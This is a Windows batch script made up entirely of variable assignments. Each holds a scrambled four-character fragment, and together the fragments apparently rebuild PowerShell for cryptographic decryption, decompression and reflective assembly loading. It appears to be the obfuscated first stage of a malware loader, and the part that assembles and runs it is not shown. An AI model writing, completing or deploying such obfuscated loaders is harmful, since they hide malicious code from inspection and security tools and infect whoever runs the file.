@echo off
set "fQYLuDXTJK=  $T"
set "NoVSExbVgs=pose"
set "NsneILcuUb=.Cre"
set "wpiEAbfJDb='')("
set "SKLUowtmkm=New-"
set "lToKHarjch=EJ ="
set "znfgTAzlLh=in $"
set "gshmPEVyXD=();$"
set "OoCHBCzYvh=ck($"
set "opITuarQGL=;$Mt"
set "GHsWbkYcpF=raph"
set "WOCVJVHGKe=hFuE"
set "isPhJPPFpo=y.Pa"
set "IcYmjzrtvn=iron"
set "kMXZMUSzAj=UGTu"
set "vkpxTPBlxB=flec"
set "lYDzhOFiJF= '')"
set "gvkpogmXJC=comm"
set "TUrWIzxJei=;$sP"
set "LbaTremLRZ=ring"
set "xVKnQBGRzH=hy.A"
set "YEiwfZBMhY=FGB."
set "asbWNMmHmR=ress"
set "XksneAAmpq=$KDI"
set "TGGTLlAbEd=n ''"
set "KSisEhJuSR=$bDe"
set "YZlygUkDpQ=Syst"
set "gKWhIopOYQ=ksPi"
set "HtfUyDFMIs=[-1."
set "RVnmkwhfBh=$bDe"
set "LVEYTvvhNm=nLJE"
set "GPeuQlbrmD=0O+g"
set "CMqThQPkLz=[Sys"
set "qTQePGlSBw=FGB "
set "zzxvuuVviC=ect "
set "WmkdqTLFpA=]::N"
set "qYuiTwaAIo=rtS4"
set "qMhjRSEgUs=onve"
